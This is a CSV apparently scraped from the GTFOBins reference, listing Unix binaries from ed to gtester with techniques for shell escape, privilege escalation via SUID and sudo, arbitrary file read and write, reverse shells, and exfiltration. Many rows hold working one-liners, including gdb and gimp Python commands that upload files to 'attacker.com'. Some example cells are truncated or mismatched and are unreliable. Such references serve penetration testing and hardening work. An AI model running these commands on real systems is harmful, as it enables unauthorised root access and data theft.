Binary,Function Name,Function URL,Description,Example
ed,Sudo,https://gtfobins.github.io/gtfobins/ed/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ed,Limited SUID,https://gtfobins.github.io/gtfobins/ed/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
efax,SUID,https://gtfobins.github.io/gtfobins/efax/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
efax,Sudo,https://gtfobins.github.io/gtfobins/efax/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
elvish,Shell,https://gtfobins.github.io/gtfobins/elvish/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,elvish
elvish,File write,https://gtfobins.github.io/gtfobins/elvish/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","export LFILE=file_to_write
elvish -c 'echo DATA >$E:LFILE'"
elvish,File read,https://gtfobins.github.io/gtfobins/elvish/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","export LFILE=file_to_read
elvish -c 'echo (slurp <$E:LFILE)'"
elvish,SUID,https://gtfobins.github.io/gtfobins/elvish/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
elvish,Sudo,https://gtfobins.github.io/gtfobins/elvish/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
emacs,Shell,https://gtfobins.github.io/gtfobins/emacs/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"emacs -Q -nw --eval '(term ""/bin/sh"")'"
emacs,File write,https://gtfobins.github.io/gtfobins/emacs/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","emacs file_to_write
DATA
C-x C-s"
emacs,File read,https://gtfobins.github.io/gtfobins/emacs/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",emacs file_to_read
emacs,SUID,https://gtfobins.github.io/gtfobins/emacs/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
emacs,Sudo,https://gtfobins.github.io/gtfobins/emacs/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
enscript,Shell,https://gtfobins.github.io/gtfobins/enscript/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,enscript /dev/null -qo /dev/null -I '/bin/sh >&2'
enscript,Sudo,https://gtfobins.github.io/gtfobins/enscript/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
env,Shell,https://gtfobins.github.io/gtfobins/env/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,env /bin/sh
env,SUID,https://gtfobins.github.io/gtfobins/env/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
env,Sudo,https://gtfobins.github.io/gtfobins/env/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
eqn,File read,https://gtfobins.github.io/gtfobins/eqn/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
eqn ""$LFILE"""
eqn,SUID,https://gtfobins.github.io/gtfobins/eqn/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
eqn,Sudo,https://gtfobins.github.io/gtfobins/eqn/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
espeak,File read,https://gtfobins.github.io/gtfobins/espeak/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
espeak -qXf ""$LFILE"""
espeak,SUID,https://gtfobins.github.io/gtfobins/espeak/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
espeak,Sudo,https://gtfobins.github.io/gtfobins/espeak/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ex,Shell,https://gtfobins.github.io/gtfobins/ex/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"ex
!/bin/sh"
ex,File write,https://gtfobins.github.io/gtfobins/ex/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","ex file_to_write
a
DATA
.
w
q"
ex,File read,https://gtfobins.github.io/gtfobins/ex/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","ex file_to_read
,p
q"
ex,Sudo,https://gtfobins.github.io/gtfobins/ex/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
exiftool,File write,https://gtfobins.github.io/gtfobins/exiftool/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
INPUT=input_file
exiftool -filename=$LFILE $INPUT"
exiftool,File read,https://gtfobins.github.io/gtfobins/exiftool/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
OUTPUT=output_file
exiftool -filename=$OUTPUT $LFILE
cat $OUTPUT"
exiftool,Sudo,https://gtfobins.github.io/gtfobins/exiftool/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
expand,File read,https://gtfobins.github.io/gtfobins/expand/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
expand ""$LFILE"""
expand,SUID,https://gtfobins.github.io/gtfobins/expand/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
expand,Sudo,https://gtfobins.github.io/gtfobins/expand/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
expect,Shell,https://gtfobins.github.io/gtfobins/expect/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,expect -c 'spawn /bin/sh;interact'
expect,File read,https://gtfobins.github.io/gtfobins/expect/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",expect
expect,SUID,https://gtfobins.github.io/gtfobins/expect/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
expect,Sudo,https://gtfobins.github.io/gtfobins/expect/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
facter,Shell,https://gtfobins.github.io/gtfobins/facter/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp -d)
echo 'exec(""/bin/sh"")' > $TF/x.rb
FACTERLIB=$TF facter"
facter,Sudo,https://gtfobins.github.io/gtfobins/facter/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
file,File read,https://gtfobins.github.io/gtfobins/file/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",file
file,SUID,https://gtfobins.github.io/gtfobins/file/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
file,Sudo,https://gtfobins.github.io/gtfobins/file/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
find,Shell,https://gtfobins.github.io/gtfobins/find/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,find . -exec /bin/sh \; -quit
find,File write,https://gtfobins.github.io/gtfobins/find/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
find / -fprintf ""$FILE"" DATA -quit"
find,SUID,https://gtfobins.github.io/gtfobins/find/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
find,Sudo,https://gtfobins.github.io/gtfobins/find/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
finger,File upload,https://gtfobins.github.io/gtfobins/finger/#file-upload,It can exfiltrate files on the network.,"sudo nc -l -p 79 | base64 -d > ""file_to_save"""
finger,File download,https://gtfobins.github.io/gtfobins/finger/#file-download,It can download remote files.,"base64 ""file_to_send"" | sudo nc -l -p 79"
fish,Shell,https://gtfobins.github.io/gtfobins/fish/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,fish
fish,SUID,https://gtfobins.github.io/gtfobins/fish/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
fish,Sudo,https://gtfobins.github.io/gtfobins/fish/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
flock,Shell,https://gtfobins.github.io/gtfobins/flock/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,flock -u / /bin/sh
flock,SUID,https://gtfobins.github.io/gtfobins/flock/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
flock,Sudo,https://gtfobins.github.io/gtfobins/flock/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
fmt,File read,https://gtfobins.github.io/gtfobins/fmt/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",fmt
fmt,SUID,https://gtfobins.github.io/gtfobins/fmt/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
fmt,Sudo,https://gtfobins.github.io/gtfobins/fmt/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
fold,File read,https://gtfobins.github.io/gtfobins/fold/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
fold -w99999999 ""$LFILE"""
fold,SUID,https://gtfobins.github.io/gtfobins/fold/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
fold,Sudo,https://gtfobins.github.io/gtfobins/fold/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
fping,File read,https://gtfobins.github.io/gtfobins/fping/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
fping -f $LFILE"
fping,Sudo,https://gtfobins.github.io/gtfobins/fping/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ftp,Shell,https://gtfobins.github.io/gtfobins/ftp/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"ftp
!/bin/sh"
ftp,File upload,https://gtfobins.github.io/gtfobins/ftp/#file-upload,It can exfiltrate files on the network.,"RHOST=attacker.com
ftp $RHOST
put file_to_send"
ftp,File download,https://gtfobins.github.io/gtfobins/ftp/#file-download,It can download remote files.,"RHOST=attacker.com
ftp $RHOST
get file_to_get"
ftp,Sudo,https://gtfobins.github.io/gtfobins/ftp/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
gawk,Shell,https://gtfobins.github.io/gtfobins/gawk/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"gawk 'BEGIN {system(""/bin/sh"")}'"
gawk,Non-interactive reverse shell,https://gtfobins.github.io/gtfobins/gawk/#non-interactive-reverse-shell,It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
gawk,Non-interactive bind shell,https://gtfobins.github.io/gtfobins/gawk/#non-interactive-bind-shell,It can bind a non-interactive shell to a local port to allow remote network access.,nc target.com 12345
gawk,File write,https://gtfobins.github.io/gtfobins/gawk/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
gawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'"
gawk,File read,https://gtfobins.github.io/gtfobins/gawk/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
gawk '//' ""$LFILE"""
gawk,SUID,https://gtfobins.github.io/gtfobins/gawk/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
gawk,Sudo,https://gtfobins.github.io/gtfobins/gawk/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
gawk,Limited SUID,https://gtfobins.github.io/gtfobins/gawk/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
gcc,Shell,https://gtfobins.github.io/gtfobins/gcc/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"gcc -wrapper /bin/sh,-s ."
gcc,File write,https://gtfobins.github.io/gtfobins/gcc/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_delete
gcc -xc /dev/null -o $LFILE"
gcc,File read,https://gtfobins.github.io/gtfobins/gcc/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
gcc -x c -E ""$LFILE"""
gcc,Sudo,https://gtfobins.github.io/gtfobins/gcc/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
gcloud,Shell,https://gtfobins.github.io/gtfobins/gcloud/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,less
gcloud,Sudo,https://gtfobins.github.io/gtfobins/gcloud/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
gcore,File read,https://gtfobins.github.io/gtfobins/gcore/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",gcore $PID
gcore,SUID,https://gtfobins.github.io/gtfobins/gcore/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
gcore,Sudo,https://gtfobins.github.io/gtfobins/gcore/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
gdb,Shell,https://gtfobins.github.io/gtfobins/gdb/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,gdb -nx -ex '!sh' -ex quit
gdb,Reverse shell,https://gtfobins.github.io/gtfobins/gdb/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,"socat file:`tty`,raw,echo=0 tcp-listen:12345"
gdb,File upload,https://gtfobins.github.io/gtfobins/gdb/#file-upload,It can exfiltrate files on the network.,"export URL=http://attacker.com/
export LFILE=file_to_send
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' -ex quit"
gdb,File download,https://gtfobins.github.io/gtfobins/gdb/#file-download,It can download remote files.,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])' -ex quit"
gdb,File write,https://gtfobins.github.io/gtfobins/gdb/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
gdb -nx -ex ""dump value $LFILE \""DATA\"""" -ex quit"
gdb,File read,https://gtfobins.github.io/gtfobins/gdb/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","gdb -nx -ex 'python print(open(""file_to_read"").read())' -ex quit"
gdb,Library load,https://gtfobins.github.io/gtfobins/gdb/#library-load,It loads shared libraries that may be used to run code in the binary execution context.,"gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary(""lib.so"")' -ex quit"
gdb,SUID,https://gtfobins.github.io/gtfobins/gdb/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
gdb,Sudo,https://gtfobins.github.io/gtfobins/gdb/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
gdb,Capabilities,https://gtfobins.github.io/gtfobins/gdb/#capabilities,"If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.",CAP_SETUID
gem,Shell,https://gtfobins.github.io/gtfobins/gem/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,rdoc
gem,Sudo,https://gtfobins.github.io/gtfobins/gem/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
genie,Shell,https://gtfobins.github.io/gtfobins/genie/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,genie -c '/bin/sh'
genie,SUID,https://gtfobins.github.io/gtfobins/genie/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
genie,Sudo,https://gtfobins.github.io/gtfobins/genie/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
genisoimage,File read,https://gtfobins.github.io/gtfobins/genisoimage/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
genisoimage -q -o - ""$LFILE"""
genisoimage,SUID,https://gtfobins.github.io/gtfobins/genisoimage/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
genisoimage,Sudo,https://gtfobins.github.io/gtfobins/genisoimage/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ghc,Shell,https://gtfobins.github.io/gtfobins/ghc/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"ghc -e 'System.Process.callCommand ""/bin/sh""'"
ghc,Sudo,https://gtfobins.github.io/gtfobins/ghc/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ghci,Shell,https://gtfobins.github.io/gtfobins/ghci/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"ghci
System.Process.callCommand ""/bin/sh"""
ghci,Sudo,https://gtfobins.github.io/gtfobins/ghci/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
gimp,Shell,https://gtfobins.github.io/gtfobins/gimp/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'"
gimp,Reverse shell,https://gtfobins.github.io/gtfobins/gimp/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,"socat file:`tty`,raw,echo=0 tcp-listen:12345"
gimp,File upload,https://gtfobins.github.io/gtfobins/gimp/#file-upload,It can exfiltrate files on the network.,"export URL=http://attacker.com/
export LFILE=file_to_send
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))'"
gimp,File download,https://gtfobins.github.io/gtfobins/gimp/#file-download,It can download remote files.,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])'"
gimp,File write,https://gtfobins.github.io/gtfobins/gimp/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","gimp -idf --batch-interpreter=python-fu-eval -b 'open(""file_to_write"", ""wb"").write(""DATA"")'"
gimp,File read,https://gtfobins.github.io/gtfobins/gimp/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","gimp -idf --batch-interpreter=python-fu-eval -b 'print(open(""file_to_read"").read())'"
gimp,Library load,https://gtfobins.github.io/gtfobins/gimp/#library-load,It loads shared libraries that may be used to run code in the binary execution context.,"gimp -idf --batch-interpreter=python-fu-eval -b 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")'"
gimp,SUID,https://gtfobins.github.io/gtfobins/gimp/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
gimp,Sudo,https://gtfobins.github.io/gtfobins/gimp/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ginsh,Shell,https://gtfobins.github.io/gtfobins/ginsh/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"ginsh
!/bin/sh"
ginsh,Sudo,https://gtfobins.github.io/gtfobins/ginsh/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ginsh,Limited SUID,https://gtfobins.github.io/gtfobins/ginsh/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
git,Shell,https://gtfobins.github.io/gtfobins/git/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"PAGER='sh -c ""exec sh 0<&1""' git -p help"
git,File write,https://gtfobins.github.io/gtfobins/git/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",git diff /dev/null /path/to/file >x.patch
git,File read,https://gtfobins.github.io/gtfobins/git/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",diff
git,Sudo,https://gtfobins.github.io/gtfobins/git/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
git,Limited SUID,https://gtfobins.github.io/gtfobins/git/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
grc,Shell,https://gtfobins.github.io/gtfobins/grc/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,grc --pty /bin/sh
grc,Sudo,https://gtfobins.github.io/gtfobins/grc/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
grep,File read,https://gtfobins.github.io/gtfobins/grep/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
grep '' $LFILE"
grep,SUID,https://gtfobins.github.io/gtfobins/grep/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
grep,Sudo,https://gtfobins.github.io/gtfobins/grep/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
gtester,Shell,https://gtfobins.github.io/gtfobins/gtester/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp)
echo '#!/bin/sh' > $TF
echo 'exec /bin/sh -p 0<&1' >> $TF
chmod +x $TF
gtester -q $TF"
gtester,File write,https://gtfobins.github.io/gtfobins/gtester/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","<testbinary path=""DATA"">"
gtester,SUID,https://gtfobins.github.io/gtfobins/gtester/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
gtester,Sudo,https://gtfobins.github.io/gtfobins/gtester/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
